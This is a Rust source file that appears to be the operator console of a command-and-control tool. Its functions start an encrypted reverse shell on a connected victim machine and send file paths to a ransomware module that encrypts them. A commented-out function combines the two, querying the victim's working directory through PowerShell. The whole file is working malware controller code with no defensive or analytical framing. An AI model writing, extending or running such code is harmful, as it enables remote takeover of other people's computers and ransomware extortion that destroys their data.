use std::{sync::Arc, time::Duration};

use shared::{encrypted_write_from_key, ControlCode, ControlPacket, DataPacket, ModuleType};
use tokio::{io::{self, AsyncReadExt, AsyncWriteExt}, net::tcp::OwnedWriteHalf, sync::{mpsc::{self, Receiver}, watch, Mutex}, time::{self, sleep}};
use tokio_util::sync::CancellationToken;

use crate::Connection;

pub async fn connection_handler(connection: &Connection) -> std::io::Result<()> {
    loop {
        let mut input = [0; 1024];
        let n = io::stdin().read(&mut input).await?;
        
        match &input[..n] {
            b"start shell\r\n" => {
                if connection.modules_map.contains_key(&ModuleType::ReverseShell) {
                    let data = ControlPacket {
                        module_type: ModuleType::ReverseShell,
                        control_code: ControlCode::Start
                    };
                    let (sx, rx) = mpsc::channel(64);
                    *connection.modules_map.get(&ModuleType::ReverseShell).unwrap().lock().await = sx;
                    encrypted_write_from_key(connection.writer.clone(), &connection.key, data).await?;
                    reverse_shell_handler(rx, connection.writer.clone(), &connection.key).await?;
                } else {
                    io::stdout().write_all(b"ReverseShell Module is not present for this connection").await?;
                }
            }

            b"encrypt\r\n" => {
                if connection.modules_map.contains_key(&ModuleType::RansomWare) {
                    let (sx, rx) = mpsc::channel(64);
                    *connection.modules_map.get(&ModuleType::RansomWare).unwrap().lock().await = sx;         
                    ransomware_handler(rx, connection.writer.clone(), &connection.key).await?;
                } else {
                    io::stdout().write_all(b"RansomWare Module not present").await?;
                }
            }

            b"exit\r\n" => {
                return Ok(())
            }

            _ => ()
        }

    }
} 







pub async fn reverse_shell_handler(mut rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {
    let token = CancellationToken::new();
    let token2 = token.clone();

    //STDOUT + STDERR
    let reader_handle = tokio::spawn(async move {
        loop {
            tokio::select! {
                Some(data) = rx.recv() => {
                    io::stderr().write(&data).await?;
                    io::stderr().flush().await?;
                }
                _ = token.cancelled() => {
                    break
                }
            }
        }
        Ok::<(), std::io::Error>(())
    });

    //STDIN
    loop {
        let mut buf = [0; 1024];
        let n = io::stdin().read(&mut buf).await?;
        let data = DataPacket {
            module_type: ModuleType::ReverseShell,
            data: buf[..n].to_vec()
        };
        encrypted_write_from_key(writer.clone(), key, data).await?;
        if &buf[..n] == "exit\r\n".as_bytes() {
            sleep(Duration::from_millis(50)).await;
            eprint!("\x1B[2J\x1B[1;1H");
            eprint!("Terminal Closed...");
            eprint!("\n");
            token2.cancel();
            io::stderr().flush().await?;
            sleep(Duration::from_millis(50)).await;
            break
        }
    }
    reader_handle.await??;
    Ok(())
}



pub async fn ransomware_handler(mut rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {
    loop {
        let mut buf = [0; 1024];
        let n = io::stdin().read(&mut buf).await?;

        if &buf[..n] == b"exit\r\n" {
            break
        }
        if n < 11 {
            println!("enter a longer path");
            continue
        }

        if &buf[..8] != b"encrypt " {
            println!("wrong format for command");
            continue
        }
        let data = DataPacket {
            module_type: ModuleType::RansomWare,
            data: buf[8..n-2].to_vec()
        };
        encrypted_write_from_key(writer.clone(), key, data).await?;

    }
    Ok(())
}

/* pub async fn remote_encryption_handler(mut rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {
    let (dir_sx, mut dir_rx) = watch::channel(0);
    let current_working_directory = Arc::new(Mutex::new(String::new()));
    let workingdir = current_working_directory.clone();
    let token = CancellationToken::new();
    let token2 = token.clone();
    dir_rx.mark_changed();
    let mut first_connect = true;

    //STDOUT
    let reader_handle = tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = dir_rx.changed() => {
                    if let Some(path_data) = rx.recv().await {
                        let mut lock = current_working_directory.lock().await;
                        *lock = from_utf8(&path_data).unwrap().to_string();
                    }
                }
                Some(data) = rx.recv() => {
                    io::stderr().write(&data).await?;
                    io::stderr().flush().await?;
                }
                _ = token.cancelled() => {
                    break
                }
            }
        }
        Ok::<(), std::io::Error>(())
    });

    //STDIN
    loop {
        let get_workingdir_path = DataPacket {
            data: b"($pwd).path\r\n".to_vec(),
            module_type: ModuleType::ReverseShell
        }; 
        if first_connect {
            let copy = dir_sx.clone();
            tokio::spawn(async move {
                time::sleep(Duration::from_secs(3)).await;
                copy.send(1).unwrap();
            });
        } else {
            dir_sx.send(1).unwrap();
        }
        encrypted_write_from_key(writer.clone(), key, get_workingdir_path).await?;
        let mut buf = [0; 1024];
        let n = io::stdin().read(&mut buf).await?;
        let data = DataPacket {
            module_type: ModuleType::ReverseShell,
            data: buf[..n].to_vec()
        };
        if &buf[..7] == b"encrypt" {
            if buf.len() < 11 {
                io::stderr().write(b"Incorrect format").await?;
                continue
            }
            let mut path: Vec<u8> = vec![];
            let lock = workingdir.lock().await;
            path.extend(lock.as_bytes());
            path.extend(&buf[8..n-2]);
            let data = DataPacket {
                module_type: ModuleType::RansomWare,
                data: path
            };
            encrypted_write_from_key(writer.clone(), key, data).await?;
            continue
        }
        encrypted_write_from_key(writer.clone(), key, data).await?;
        if &buf[..n] == b"exit\r\n" {
            sleep(Duration::from_millis(50)).await;
            io::stderr().write(b"\x1B[2J\x1B[1;1H\nTerminal Closed\n").await?;
            token2.cancel();
            io::stderr().flush().await?;
            sleep(Duration::from_millis(50)).await;
            break
        }
    }
    reader_handle.await??;
    Ok(())
} */


